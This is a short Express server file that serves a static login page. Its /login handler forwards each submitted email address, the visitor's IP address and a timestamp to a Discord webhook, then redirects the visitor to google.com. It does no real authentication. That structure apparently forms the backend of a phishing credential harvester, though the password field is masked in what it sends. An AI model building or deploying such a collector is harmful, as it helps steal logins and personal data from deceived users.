// server.js

const express = require("express");
const path = require("path");
const axios = require("axios");

const app = express();
const PORT = process.env.PORT || 3000;

// Discord Webhook URL from environment variable
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

// ✅ Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ✅ Serve static files
app.use(express.static(path.join(__dirname, "assets")));

// ✅ Load main HTML page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "assets", "index.html"));
});

// ✅ Handle login
app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  console.log("Login attempt - Email:", email);

  // Send to Discord
  if (DISCORD_WEBHOOK_URL) {
    try {
      await axios.post(DISCORD_WEBHOOK_URL, {
        embeds: [
          {
            title: "🔓 New Login Attempt",
            color: 16711680, // Red color
            fields: [
              {
                name: "Email",
                value: email || "N/A",
                inline: false
              },
              {
                name: "Password",
                value: password ? "••••••••" : "N/A", // Don't expose password
                inline: false
              },
              {
                name: "Timestamp",
                value: new Date().toISOString(),
                inline: false
              },
              {
                name: "IP Address",
                value: req.ip || "N/A",
                inline: false
              }
            ]
          }
        ]
      });
      console.log("✅ Data sent to Discord successfully");
    } catch (error) {
      console.error("❌ Failed to send to Discord:", error.message);
    }
  } else {
    console.warn("⚠️ DISCORD_WEBHOOK_URL not set");
  }

  // Redirect after submission
  res.redirect("https://google.com");
});

// ✅ Error handling
app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).json({ error: "Server error" });
});

// ✅ Start server
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
